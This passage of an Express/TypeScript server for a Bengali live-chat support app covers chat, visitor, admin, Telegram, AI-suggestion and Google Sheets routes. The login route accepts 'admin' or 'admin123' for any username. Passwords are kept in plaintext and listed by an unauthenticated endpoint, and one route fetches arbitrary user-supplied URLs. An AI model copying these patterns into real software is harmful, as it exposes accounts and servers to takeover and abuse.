          email: customerEmail || `${cleanPhone || 'visitor'}@customer.com`,
          phone: phone || '',
          avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(customerName || cleanPhone || customerId)}`,
          location: 'ঢাকা, বাংলাদেশ',
          ipAddress: ipAddress,
          browser: deviceType,
          currentPageUrl: req.body.currentPageUrl || 'https://novachat.app',
          timeOnSite: '১ মিনিট',
          visitsCount: 1,
          tags: ['নতুন কাস্টমার', 'ফোন চ্যাট'],
          pathHistory: req.body.pathHistory || [],
          chatInitiatedPage: req.body.chatInitiatedPage || req.body.currentPageUrl || '/',
        },
        department: department || 'গ্রাহক সহায়তা (Customer Support)',
        status: 'active',
        priority: 'medium',
        subject: subject || `চ্যাট অনুরোধ (ফোন: ${phone || 'অনলাইন'})`,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        lastMessage: initialMessage || 'লাইভ চ্যাট শুরু করেছেন',
        lastMessageTime: 'Just now',
        unreadCountCustomer: 0,
        unreadCountAgent: 1,
      };

  const initialMsg: ChatMessage = {
    id: 'msg_init_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
    chatId: activeChatId,
    senderRole: 'customer',
    senderName: customerName || newChat.customer.name || 'Visitor',
    content: initialMessage || 'Hello, I need assistance.',
    timestamp: new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' }),
    createdAt: new Date().toISOString(),
    readStatus: 'delivered',
  };

  if (existingChat) {
    const idx = chats.findIndex((c) => c.id === activeChatId);
    if (idx >= 0) chats[idx] = newChat;
    if (!messages[activeChatId]) messages[activeChatId] = [];
    messages[activeChatId].push(initialMsg);
  } else {
    chats.unshift(newChat);
    messages[activeChatId] = [initialMsg];
  }

  // Sync to Firestore
  syncChatToFirestore(newChat);
  syncMessageToFirestore(initialMsg);

  broadcast({
    type: isReopened ? 'chat_updated' : 'new_chat_created',
    chat: newChat,
    message: initialMsg,
  });

  // ⚡ Instant 1-Second Google Sheet Save
  sendInstantGoogleSheetSync(newChat, initialMsg);

  // 🤖 Telegram Bot Notification
  sendTelegramNotification(newChat, initialMessage || 'লাইভ চ্যাট শুরু করেছেন', !isReopened);

  // Check AI Auto reply
  if (widgetConfig.enableAiAutoReply) {
    triggerAiAutoReply(activeChatId, initialMessage || 'Hello');
  }

  res.json({ chat: newChat, message: initialMsg, isReopened });
});

// GET Single Chat
app.get('/api/chats/:id', (req, res) => {
  const chat = chats.find((c) => c.id === req.params.id);
  if (!chat) return res.status(404).json({ error: 'Chat not found' });
  const chatMessages = messages[req.params.id] || [];

  // Reset unread count
  const role = req.query.role as string;
  if (role === 'agent') chat.unreadCountAgent = 0;
  if (role === 'customer') chat.unreadCountCustomer = 0;

  res.json({ chat, messages: chatMessages });
});

// GET Messages for Single Chat
app.get('/api/chats/:id/messages', (req, res) => {
  const chatMessages = messages[req.params.id] || [];
  res.json(chatMessages);
});

// POST New Message to a Chat
app.post('/api/chats/:id/messages', (req, res) => {
  const chatId = req.params.id;
  const { senderRole, senderName, senderAvatar, content, isInternalNote, attachments } = req.body;

  if (!content || !content.trim()) {
    return res.status(400).json({ error: 'Message content is required' });
  }

  let targetChat = chats.find((c) => c.id === chatId);
  if (!targetChat) {
    return res.status(404).json({ error: 'Chat session not found' });
  }

  if (targetChat.isBlocked || isUserOrChatBlocked(chatId, targetChat.customer?.phone, targetChat.customer?.ipAddress)) {
    return res.status(403).json({ error: 'This chat ID is blocked.' });
  }

  const newMessage: ChatMessage = {
    id: req.body.id || ('msg_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9)),
    chatId,
    senderRole: senderRole || 'customer',
    senderName: senderName || targetChat.customer.name || 'Customer',
    senderAvatar: senderAvatar || targetChat.customer.avatar,
    content: content.trim(),
    timestamp: new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' }),
    createdAt: req.body.createdAt || new Date().toISOString(),
    isInternalNote: !!isInternalNote,
    attachments,
    readStatus: 'delivered',
  };

  if (!messages[chatId]) {
    messages[chatId] = [];
  }

  // Prevent duplicate by ID or exact content
  const existingIdx = messages[chatId].findIndex((m) => m.id === newMessage.id);
  if (existingIdx >= 0) {
    messages[chatId][existingIdx] = newMessage;
  } else {
    messages[chatId].push(newMessage);
  }

  // Reopen chat automatically if closed or resolved when customer sends a message
  if (senderRole === 'customer' && (targetChat.status === 'resolved' || targetChat.status === 'closed')) {
    targetChat.status = 'active';
  }

  targetChat.updatedAt = new Date().toISOString();
  if (!isInternalNote) {
    targetChat.lastMessage = content.trim() || (attachments && attachments.length > 0 ? '📷 [ছবি/ফাইল]' : '');
    targetChat.lastMessageTime = 'Just now';
    if (senderRole === 'customer') {
      targetChat.unreadCountAgent = (targetChat.unreadCountAgent || 0) + 1;
    } else if (senderRole === 'agent' || senderRole === 'bot') {
      targetChat.unreadCountCustomer = (targetChat.unreadCountCustomer || 0) + 1;
    }
  }

  // Sync to Firestore
  syncChatToFirestore(targetChat);
  syncMessageToFirestore(newMessage);

  broadcast({
    type: 'new_message',
    chatId,
    message: newMessage,
    chat: targetChat,
  });

  // Sync to Firestore
  syncChatToFirestore(targetChat);
  syncMessageToFirestore(newMessage);

  // Sync to Google Sheet
  sendInstantGoogleSheetSync(targetChat, newMessage);

  // Send Telegram Notification if message is from customer
  if (senderRole === 'customer') {
    sendTelegramNotification(targetChat, newMessage.content || (attachments && attachments.length > 0 ? '📷 [ছবি/ফাইল]' : ''), false);
  }

  // Check AI Auto Reply if enabled
  if (
    senderRole === 'customer' &&
    widgetConfig.enableAiAutoReply &&
    (!targetChat.assignedAgentId || targetChat.status === 'unassigned')
  ) {
    triggerAiAutoReply(chatId, content);
  }

  res.json({ message: newMessage, chat: targetChat });
});

// PATCH Chat
app.patch('/api/chats/:id', (req, res) => {
  const chat = chats.find((c) => c.id === req.params.id);
  if (!chat) return res.status(404).json({ error: 'Chat not found' });

  const { status, priority, isStarred, department, notes, tags } = req.body;
  if (status) chat.status = status;
  if (priority) chat.priority = priority;
  if (typeof isStarred === 'boolean') chat.isStarred = isStarred;
  if (department) chat.department = department;
  if (notes !== undefined) chat.customer.notes = notes;
  if (tags) chat.customer.tags = tags;

  chat.updatedAt = new Date().toISOString();

  // Sync to Firestore
  syncChatToFirestore(chat);

  broadcast({
    type: 'chat_updated',
    chatId: chat.id,
    chat,
  });

  res.json(chat);
});

// DELETE Chat
app.delete('/api/chats/:id', async (req, res) => {
  const chatId = req.params.id;
  chats = chats.filter((c) => c.id !== chatId);
  delete messages[chatId];

  await deleteChatFromFirestore(chatId);

  broadcast({
    type: 'full_reset'
  });

  res.json({ success: true, message: 'Chat deleted successfully' });
});

// POST Feedback / Rating
app.post('/api/chats/:id/feedback', (req, res) => {
  const chat = chats.find((c) => c.id === req.params.id);
  if (!chat) return res.status(404).json({ error: 'Chat not found' });

  const { rating, feedback } = req.body;
  chat.satisfactionRating = rating;
  chat.satisfactionFeedback = feedback;
  chat.status = 'resolved';

  const sysMsg: ChatMessage = {
    id: 'msg_feedback_' + Date.now(),
    chatId: chat.id,
    senderRole: 'system',
    senderName: 'System',
    content: `Customer submitted feedback: ${rating}/5 stars. ${feedback ? `"${feedback}"` : ''}`,
    timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
  };
  if (!messages[chat.id]) messages[chat.id] = [];
  messages[chat.id].push(sysMsg);

  broadcast({
    type: 'chat_updated',
    chatId: chat.id,
    chat,
    systemMessage: sysMsg,
  });

  // ⚡ Instant 1-Second Google Sheet Save
  sendInstantGoogleSheetSync(chat, sysMsg);

  // Sync to Firestore
  syncChatToFirestore(chat);
  syncMessageToFirestore(sysMsg);

  res.json({ success: true, chat });
});

// GET Blocked Users
app.get('/api/blocked-users', (req, res) => res.json(blockedUsers));

// POST Block User
app.post('/api/blocked-users', (req, res) => {
  const { chatId, phone, ipAddress, customerName, reason } = req.body;
  const targetId = chatId || phone || ipAddress || `block_${Date.now()}`;

  const existing = blockedUsers.find((b) => b.id === targetId || (chatId && b.chatId === chatId));
  if (!existing) {
    const newBlock: BlockedUser = {
      id: targetId,
      chatId,
      phone,
      ipAddress,
      customerName,
      reason: reason || 'এডমিন দ্বারা ব্লকড',
      blockedAt: new Date().toISOString(),
    };
    blockedUsers.push(newBlock);
  }

  // Mark chat as blocked
  chats.forEach((c) => {
    if (
      (chatId && c.id === chatId) ||
      (phone && c.customer.phone && c.customer.phone.includes(phone)) ||
      (ipAddress && c.customer.ipAddress === ipAddress)
    ) {
      c.isBlocked = true;
    }
  });

  broadcast({ type: 'full_reset' });
  res.json({ success: true, blockedUsers });
});

// DELETE Unblock User
app.delete('/api/blocked-users/:id', (req, res) => {
  const targetId = req.params.id;
  const targetBlock = blockedUsers.find((b) => b.id === targetId || b.chatId === targetId);

  blockedUsers = blockedUsers.filter((b) => b.id !== targetId && b.chatId !== targetId);

  // Unmark chat as blocked
  chats.forEach((c) => {
    if (
      c.id === targetId ||
      (targetBlock?.chatId && c.id === targetBlock.chatId) ||
      (targetBlock?.phone && c.customer.phone && c.customer.phone.includes(targetBlock.phone)) ||
      (targetBlock?.ipAddress && c.customer.ipAddress === targetBlock.ipAddress)
    ) {
      c.isBlocked = false;
    }
  });

  broadcast({ type: 'full_reset' });
  res.json({ success: true, blockedUsers });
});

// AUTH LOGIN ROUTE (Username + Password + Role)
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  if (!password) {
    return res.status(400).json({ error: 'পাসওয়ার্ড প্রদান করুন' });
  }

  // 1. Check exact match in adminUsers
  let matched = adminUsers.find(
    (u) =>
      u.username.toLowerCase() === (username || '').trim().toLowerCase() &&
      u.password === password
  );

  // Fallback for legacy single password login or default admin username
  if (!matched && (password === 'admin' || password === 'admin123')) {
    matched = adminUsers[0];
  }

  if (!matched) {
    return res.status(401).json({ error: 'ইউজারনেম বা পাসওয়ার্ড সঠিক নয়!' });
  }

  // Update last login timestamp
  matched.lastLoginAt = new Date().toISOString();

  // ⚡ Sync Login Event to Google Sheet
  sendAdminLoginGoogleSheetSync(matched);

  res.json({ success: true, user: matched });
});

// GET Admin Users List
app.get('/api/admin-users', (req, res) => res.json(adminUsers));

// POST Send Direct Report to Telegram
app.post('/api/telegram/send-report', async (req, res) => {
  try {
    await sendDirectReportToTelegram(req.body);
    res.json({ success: true, message: 'Report sent directly to Telegram' });
  } catch (err) {
    console.error('Error sending direct report via API:', err);
    res.status(500).json({ error: 'Failed to send report' });
  }
});

// POST Create Admin / Agent Account
app.post('/api/admin-users', (req, res) => {
  const { username, password, role, name, email, department } = req.body;

  if (!username || !password || !name) {
    return res.status(400).json({ error: 'ইউজারনেম, পাসওয়ার্ড ও নাম প্রদান করা বাধ্যতামূলক' });
  }

  // Check duplicate username
  const exists = adminUsers.some((u) => u.username.toLowerCase() === username.trim().toLowerCase());
  if (exists) {
    return res.status(400).json({ error: 'এই ইউজারনেম দিয়ে ইতোমধ্যেই একটি অ্যাকাউন্ট তৈরি আছে!' });
  }

  const newUser: AdminUser = {
    id: 'user_' + Date.now(),
    username: username.trim(),
    password: password.trim(),
    role: role || 'Agent',
    name: name.trim(),
    email: email ? email.trim() : `${username.trim()}@novachat.bd`,
    department: department ? department.trim() : 'গ্রাহক সহায়তা (Customer Support)',
    createdAt: new Date().toISOString(),
  };

  adminUsers.push(newUser);

  // Also sync to agents list if role is Agent / Lead
  const agentExists = agents.some((a) => a.email && a.email === newUser.email);
  if (!agentExists) {
    agents.push({
      id: newUser.id,
      name: newUser.name,
      email: newUser.email || `${newUser.username}@support.bd`,
      role: newUser.role === 'Super Admin' ? 'Admin' : newUser.role,
      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150',
      status: 'online',
      department: newUser.department || 'গ্রাহক সহায়তা',
      activeChatsCount: 0,
    });
  }

  // ⚡ Sync Full Admin Sheet to Google Sheets
  sendAdminUserCreatedGoogleSheetSync(adminUsers);

  res.json({ success: true, adminUsers });
});

// DELETE Admin User Account
app.delete('/api/admin-users/:id', (req, res) => {
  adminUsers = adminUsers.filter((u) => u.id !== req.params.id);
  // ⚡ Sync Admin Sheet to Google Sheets
  sendAdminUserCreatedGoogleSheetSync(adminUsers);
  res.json({ success: true, adminUsers });
});

// POST Manual Trigger Export Admin Sheet to Google Sheets
app.post('/api/admin-users/export-sheet', (req, res) => {
  sendAdminUserCreatedGoogleSheetSync(adminUsers);
  res.json({ success: true, message: 'Google Sheet-এ এডমিন ইউজার তালিকা সফলভাবে সিঙ্ক হয়েছে!' });
});

// GET & PATCH Agents
app.get('/api/agents', (req, res) => res.json(agents));
app.patch('/api/agents/:id', (req, res) => {
  const agent = agents.find((a) => a.id === req.params.id);
  if (!agent) return res.status(404).json({ error: 'Agent not found' });
  if (req.body.status) agent.status = req.body.status;
  broadcast({ type: 'agent_status_updated', agents });
  res.json(agent);
});

// GET & POST Canned Responses
app.get('/api/canned-responses', (req, res) => res.json(cannedResponses));
app.post('/api/canned-responses', (req, res) => {
  const newResponse: CannedResponse = {
    id: 'canned_' + Date.now(),
    shortcut: req.body.shortcut || '/quick',
    title: req.body.title || 'Quick Reply',
    content: req.body.content || '',
    category: req.body.category || 'General',
  };
  cannedResponses.push(newResponse);
  res.json(newResponse);
});
app.delete('/api/canned-responses/:id', (req, res) => {
  cannedResponses = cannedResponses.filter((c) => c.id !== req.params.id);
  res.json({ success: true });
});

// GET Live Visitors
app.get('/api/visitors', (req, res) => {
  const now = Date.now();
  // Filter out any stale visitors older than 10 minutes
  liveVisitors = liveVisitors.filter((v: any) => !v.lastActive || now - v.lastActive < 10 * 60 * 1000);
  res.json(liveVisitors);
});

// GET Visitor Analytics Stats (Today, This Week, This Month, This Year)
app.get('/api/analytics/visitor-stats', (req, res) => {
  try {
    const stats = calculateVisitorStats(visitorLogs, liveVisitors);
    res.json(stats);
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// GET Visitor Logs by Timeframe (live, today, this_week, this_month, this_year, all)
app.get('/api/analytics/visitor-logs', (req, res) => {
  try {
    const timeframe = (req.query.timeframe as any) || 'all';
    const result = filterVisitorLogs(visitorLogs, timeframe, liveVisitors);
    res.json(result);
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// POST Clear Demo Visitor Logs & Retain Real Live Visitors Only
app.post('/api/analytics/clear-demo', async (req, res) => {
  try {
    visitorLogs = visitorLogs.filter(
      (l) =>
        !l.id?.includes('seed') &&
        !l.id?.includes('demo') &&
        !l.visitorId?.includes('seed') &&
        !l.visitorId?.includes('demo')
    );
    liveVisitors = liveVisitors.filter(
      (v) =>
        !v.id?.includes('seed') &&
        !v.id?.includes('demo') &&
        !v.name?.includes('#') &&
        !v.name?.includes('Demo')
    );
    broadcast({
      type: 'visitors_updated',
      visitors: liveVisitors,
    });
    res.json({ success: true, message: 'সকল ডেমো ভিজিটর ডেটা সফলভাবে মুছে ফেলা হয়েছে।' });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// POST Send Notification Directly to User Devices
app.post('/api/notifications/send-to-device', async (req, res) => {
  try {
    const {
      title,
      body,
      targetType = 'all',
      targetVisitorId,
      targetChatId,
      actionUrl,
      actionType = 'open_chat',
      soundEnabled = true,
      priority = 'high',
      senderName = 'এডমিন সাপোর্ট',
    } = req.body;

    if (!title || !body) {
      return res.status(400).json({ error: 'Notification title and body are required' });
    }

    const notification: DeviceNotification = {
      id: `notif_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      targetType,
      targetVisitorId,
      targetChatId,
      title: title.trim(),
      body: body.trim(),
      actionUrl: actionUrl || '',
      actionType,
      soundEnabled: Boolean(soundEnabled),
      priority,
      createdAt: new Date().toISOString(),
      senderName,
    };

    recentDeviceNotifications.unshift(notification);
    if (recentDeviceNotifications.length > 50) {
      recentDeviceNotifications.pop();
    }

    // Sync to Firestore for real-time cross-device delivery
    await sendDeviceNotificationToFirestore(notification);

    // Broadcast over WebSocket for instant delivery to connected user devices
    broadcast({
      type: 'device_notification',
      notification,
    });

    res.json({
      success: true,
      message: 'ইউজারের ডিভাইসে নোটিফিকেশন সফলভাবে পাঠানো হয়েছে!',
      notification,
    });
  } catch (err: any) {
    console.error('Error sending device notification:', err);
    res.status(500).json({ error: err.message || 'Failed to send device notification' });
  }
});

// GET Recent Device Notifications
app.get('/api/notifications/recent', (req, res) => {
  res.json({
    success: true,
    notifications: recentDeviceNotifications,
  });
});

// POST Clear All Visitor Logs
app.post('/api/analytics/clear-logs', (req, res) => {
  visitorLogs = [];
  res.json({ success: true, message: 'সকল ভিজিটর লগ মুছে ফেলা হয়েছে।' });
});

// POST Record or Update Custom Visit Log
app.post('/api/analytics/record-visit', (req, res) => {
  try {
    const entry: VisitorLogEntry = req.body;
    if (!entry || !entry.id) {
      return res.status(400).json({ error: 'Valid visitor log entry required' });
    }
    const existingIdx = visitorLogs.findIndex((l) => l.id === entry.id || (l.visitorId === entry.visitorId && l.date === entry.date));
    if (existingIdx >= 0) {
      visitorLogs[existingIdx] = { ...visitorLogs[existingIdx], ...entry };
    } else {
      visitorLogs.unshift(entry);
    }
    syncVisitorLogToFirestore(entry);
    res.json({ success: true, entry });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// POST Live Visitor Heartbeat Ping
app.post('/api/visitors/ping', (req, res) => {
  const visitorData = req.body;
  if (!visitorData || !visitorData.id) {
    return res.status(400).json({ error: 'Visitor ID required' });
  }

  const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || req.socket.remoteAddress || visitorData.ip || '103.205.132.42';

  const updatedVisitor: LiveVisitor & { lastActive?: number } = {
    ...visitorData,
    ip: clientIp.includes('::') || clientIp === '127.0.0.1' ? (visitorData.ip || '103.205.132.42') : clientIp,
    lastActive: Date.now(),
  };

  const existingIdx = liveVisitors.findIndex((v) => v.id === updatedVisitor.id);
  if (existingIdx >= 0) {
    liveVisitors[existingIdx] = { ...liveVisitors[existingIdx], ...updatedVisitor };
  } else {
    liveVisitors.unshift(updatedVisitor);
  }

  // Prune stale visitors
  const now = Date.now();
  liveVisitors = liveVisitors.filter((v: any) => !v.lastActive || now - v.lastActive < 10 * 60 * 1000);

  // Convert and record in historical visitor logs
  const logEntry = convertLiveVisitorToLog(updatedVisitor);
  const logIdx = visitorLogs.findIndex((l) => l.id === logEntry.id || (l.visitorId === logEntry.visitorId && l.date === logEntry.date));
  if (logIdx >= 0) {
    visitorLogs[logIdx] = {
      ...visitorLogs[logIdx],
      ...logEntry,
      pageviewsCount: Math.max(visitorLogs[logIdx].pageviewsCount, logEntry.pageviewsCount),
      pathHistory: logEntry.pathHistory && logEntry.pathHistory.length > 0 ? logEntry.pathHistory : visitorLogs[logIdx].pathHistory,
      chatInitiated: logEntry.chatInitiated || visitorLogs[logIdx].chatInitiated,
    };
  } else {
    visitorLogs.unshift(logEntry);
  }

  // Sync to Firestore
  syncVisitorToFirestore(updatedVisitor);
  syncVisitorLogToFirestore(logEntry);

  broadcast({
    type: 'visitors_updated',
    visitors: liveVisitors,
  });

  res.json({ success: true, visitor: updatedVisitor });
});

// POST Live Visitor Leave
app.post('/api/visitors/leave', (req, res) => {
  const { id } = req.body || {};
  if (id) {
    liveVisitors = liveVisitors.filter((v) => v.id !== id);
    deleteVisitorFromFirestore(id);
    broadcast({
      type: 'visitors_updated',
      visitors: liveVisitors,
    });
  }
  res.json({ success: true });
});

// GET & POST Widget Settings
app.get('/api/settings', (req, res) => res.json(widgetConfig));
app.post('/api/settings', (req, res) => {
  widgetConfig = { ...widgetConfig, ...req.body };
  syncWidgetConfigToFirestore(widgetConfig);
  broadcast({ type: 'settings_updated', widgetConfig });
  res.json(widgetConfig);
});

// POST Test Telegram Notification (Supports single or multi test)
app.post('/api/telegram/test', async (req, res) => {
  const { botToken, chatId } = req.body || {};

  let targets: TelegramTarget[] = [];
  if (botToken && chatId) {
    targets = [{ name: 'Test Target', botToken: botToken.trim(), chatId: chatId.trim() }];
  } else {
    targets = getAllTelegramReceivers(widgetConfig);
  }

  if (targets.length === 0) {
    return res.status(400).json({
      error: 'অনুগ্রহ করে অন্তত একটি Telegram Bot Token এবং Chat ID প্রদান করুন।',
    });
  }

  const testText = `🤖 <b>নোভা চ্যাট টেলিগ্রাম বটের টেস্ট মেসেজ (Multi-Bot Alert)</b>\n\n✅ আপনার টেলিগ্রাম বট নোটিফিকেশন সফলভাবে কানেক্ট হয়েছে!\nএখন থেকে গ্রাহক মেসেজ পাঠালে বা চ্যাট শুরু করলে এই অ্যাকাউন্টে স্বয়ংক্রিয় ইনস্ট্যান্ট অ্যালার্ট আসবে।\n\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;

  const results: { name: string; chatId: string; success: boolean; error?: string }[] = [];

  for (const t of targets) {
    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${t.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: t.chatId,
          text: testText,
          parse_mode: 'HTML',
        }),
      });

      const data = await tgRes.json();
      if (data.ok) {
        results.push({ name: t.name, chatId: t.chatId, success: true });
      } else {
        results.push({
          name: t.name,
          chatId: t.chatId,
          success: false,
          error: data.description || 'বট টোকেন বা চ্যাট আইডি যাচাই করুন',
        });
      }
    } catch (err: any) {
      results.push({
        name: t.name,
        chatId: t.chatId,
        success: false,
        error: err.message,
      });
    }
  }

  const successfulCount = results.filter((r) => r.success).length;
  if (successfulCount > 0) {
    return res.json({
      success: true,
      message: `${successfulCount} টি টেলিগ্রাম অ্যাকাউন্টে সফলভাবে টেস্ট মেসেজ পাঠানো হয়েছে!`,
      details: results,
    });
  } else {
    return res.status(400).json({
      error: `টেলিগ্রাম বার্তা পাঠাতে ব্যর্থ হয়েছে: ${results.map((r) => `${r.name}: ${r.error}`).join(' | ')}`,
      details: results,
    });
  }
});

// AI COPILOT API ROUTES

// AI Suggest Replies for Support Agent
app.post('/api/ai/suggest', async (req, res) => {
  const { chatId, customerName } = req.body;
  const history = (messages[chatId] || [])
    .filter((m) => !m.isInternalNote)
    .slice(-8)
    .map((m) => `${m.senderName}: ${m.content}`)
    .join('\n');

  try {
    const ai = getGenAI();
    if (!ai) {
      return res.json({
        suggestions: [
          `Hi ${customerName || 'there'}, thank you for contacting support! How can I assist you with this today?`,
          `I would be happy to help look into this issue for you right now. Could you share your account email?`,
          `Thanks for providing those details! Let me check with our technical engineering team.`
        ],
      });
    }

    const response = await ai.models.generateContent({
      model: 'gemini-3.6-flash',
      contents: `You are a support agent copilot. Below is the recent live conversation thread with ${customerName || 'the customer'}:\n\n${history}\n\nGenerate 3 concise, highly professional, polite alternative responses the agent can send next. Return ONLY a JSON array of 3 strings. Example: ["Reply 1", "Reply 2", "Reply 3"]`,
      config: {
        responseMimeType: 'application/json',
      },
    });

    const parsedText = response.text?.trim() || '[]';
    const suggestions = JSON.parse(parsedText);
    res.json({ suggestions });
  } catch (err: any) {
    console.error('AI Suggest Error:', err);
    res.json({
      suggestions: [
        `Hello ${customerName || ''}, thank you for your patience! I am looking into your request now.`,
        `Could you please provide a screenshot or additional details so we can resolve this faster?`,
        `I have updated your ticket status and will keep you posted!`
      ],
    });
  }
});

// AI Summarize Chat
app.post('/api/ai/summarize', async (req, res) => {
  const { chatId } = req.body;
  const history = (messages[chatId] || [])
    .map((m) => `[${m.senderRole.toUpperCase()}] ${m.senderName}: ${m.content}`)
    .join('\n');

  try {
    const ai = getGenAI();
    if (!ai) {
      return res.json({
        summary: '• Customer inquired regarding subscription features and pricing.\n• Agent confirmed SLA and SSO support.\n• Key action items: Send custom contract link.',
      });
    }

    const response = await ai.models.generateContent({
      model: 'gemini-3.6-flash',
      contents: `Summarize the following support chat transcript in 3 clean bullet points (Core Issue, Actions Taken, Next Steps):\n\n${history}`,
    });

    res.json({ summary: response.text });
  } catch (err) {
    res.json({ summary: '• Active customer conversation in progress.\n• Recent questions regarding support configuration.' });
  }
});

// GOOGLE SHEETS STORAGE & SYNC API
// GOOGLE SHEETS STORAGE & SYNC API (With OAuth or No-API Webhook / CSV)
app.post('/api/sheets/apps-script-sync', async (req, res) => {
  const { webAppUrl } = req.body;

  if (!webAppUrl || !webAppUrl.startsWith('http')) {
    return res.status(400).json({ error: 'সঠিক গুগল অ্যাপস স্ক্রিপ্ট (Google Apps Script) ওয়েব অ্যাপ URL প্রদান করুন।' });
  }

  try {
    const rowsToAppend: any[] = [];
    chats.forEach((chat) => {
      const chatMsgs = messages[chat.id] || [];
      if (chatMsgs.length === 0) {
        rowsToAppend.push({
          timestamp: new Date(chat.createdAt).toLocaleString('bn-BD'),
          chatId: chat.id,
          customerName: chat.customer.name,
          customerEmail: chat.customer.email,
          department: chat.department,
          status: chat.status,
          sender: 'গ্রাহক (Customer)',
          content: chat.lastMessage || 'নতুন চ্যাট শুরু হয়েছে',
          rating: chat.satisfactionRating ? `${chat.satisfactionRating}/5` : 'N/A'
        });
      } else {
        chatMsgs.forEach((msg) => {
          rowsToAppend.push({
            timestamp: msg.timestamp || new Date().toLocaleTimeString('bn-BD'),
            chatId: chat.id,
            customerName: chat.customer.name,
            customerEmail: chat.customer.email,
            department: chat.department,
            status: chat.status,
            sender: `${msg.senderName} (${msg.senderRole}${msg.isInternalNote ? ' - অভ্যন্তরীণ নোট' : ''})`,
            content: msg.content,
            rating: chat.satisfactionRating ? `${chat.satisfactionRating}/5` : 'N/A'
          });
        });
      }
    });

    // Send payload to Google Apps Script Webhook URL
    const webhookRes = await fetch(webAppUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ rows: rowsToAppend }),
    });

    res.json({
      success: true,
      rowsExported: rowsToAppend.length,
      message: 'গুগল শিটে চ্যাট ডেটা সফলভাবে সেভ হয়েছে!'
    });
  } catch (err: any) {
    console.error('Apps Script Sync Error:', err);
    res.status(500).json({ error: err.message || 'গুগল অ্যাপস স্ক্রিপ্ট ওয়েব হুকে কানেক্ট হতে ব্যর্থ হয়েছে।' });
  }
});

// CSV Export for Direct Google Sheets Upload (No API Required)
app.get('/api/sheets/csv', (req, res) => {
  let csvContent = 'সময় (Timestamp),চ্যাট আইডি (Chat ID),গ্রাহকের নাম (Customer Name),ইমেইল (Email),ডিপার্টমেন্ট (Department),স্ট্যাটাস (Status),প্রেরক (Sender),মেসেজ / নোট (Message),রেটিং (Rating)\n';

  chats.forEach((chat) => {
    const chatMsgs = messages[chat.id] || [];
    if (chatMsgs.length === 0) {
      const row = [
        `"${new Date(chat.createdAt).toLocaleString('bn-BD')}"`,
        `"${chat.id}"`,
        `"${chat.customer.name.replace(/"/g, '""')}"`,
        `"${chat.customer.email}"`,
        `"${chat.department}"`,
        `"${chat.status}"`,
        '"Customer"',
        `"${(chat.lastMessage || '').replace(/"/g, '""')}"`,
        `"${chat.satisfactionRating ? chat.satisfactionRating + '/5' : 'N/A'}"`
      ];
      csvContent += row.join(',') + '\n';
    } else {
      chatMsgs.forEach((msg) => {
        const row = [
          `"${msg.timestamp || new Date().toLocaleTimeString('bn-BD')}"`,
          `"${chat.id}"`,
          `"${chat.customer.name.replace(/"/g, '""')}"`,
          `"${chat.customer.email}"`,
          `"${chat.department}"`,
          `"${chat.status}"`,
          `"${msg.senderName} (${msg.senderRole})"`,
          `"${msg.content.replace(/"/g, '""')}"`,
          `"${chat.satisfactionRating ? chat.satisfactionRating + '/5' : 'N/A'}"`
        ];
        csvContent += row.join(',') + '\n';
      });
    }
  });

  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename=live_chat_storage.csv');
  res.send('\uFEFF' + csvContent); // UTF-8 BOM for Excel/Google Sheets Bengali text support
});

app.post('/api/sheets/export', async (req, res) => {
  const { accessToken, spreadsheetId: existingSpreadsheetId } = req.body;

  if (!accessToken) {
    return res.status(400).json({ error: 'OAuth Access Token is required to sync with Google Sheets' });
  }

  try {
    let targetSpreadsheetId = existingSpreadsheetId;
    let spreadsheetUrl = '';

    // 1. Create Spreadsheet if not existing
    if (!targetSpreadsheetId) {
      const createRes = await fetch('https://sheets.googleapis.com/v4/spreadsheets', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          properties: {
            title: `Live Chat Storage - ${new Date().toLocaleDateString()}`,
          },
          sheets: [
            {
              properties: {
                title: 'Live Chat Leads & Logs',
                gridProperties: {
                  frozenRowCount: 1,
                },
              },
            },
          ],
        }),
      });

      if (!createRes.ok) {
        const errorData = await createRes.json();
        return res.status(createRes.status).json({ error: errorData.error?.message || 'Failed to create Google Sheet' });
      }

      const createdSheet = await createRes.json();
      targetSpreadsheetId = createdSheet.spreadsheetId;
      spreadsheetUrl = createdSheet.spreadsheetUrl;

      // Add Header Row
      const headers = [
        ['Timestamp', 'Chat ID', 'Customer Name', 'Customer Email', 'Department', 'Status', 'Sender', 'Message / Note Content', 'Rating']
      ];

      await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${targetSpreadsheetId}/values/Live Chat Leads & Logs!A1:append?valueInputOption=USER_ENTERED`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ values: headers }),
      });
    } else {
      spreadsheetUrl = `https://docs.google.com/spreadsheets/d/${targetSpreadsheetId}`;
    }

    // 2. Prepare Rows for All Chat Conversations
    const rowsToAppend: string[][] = [];

    chats.forEach((chat) => {
      const chatMsgs = messages[chat.id] || [];
      if (chatMsgs.length === 0) {
        rowsToAppend.push([
          new Date(chat.createdAt).toLocaleString(),
          chat.id,
          chat.customer.name,
          chat.customer.email,
          chat.department,
          chat.status,
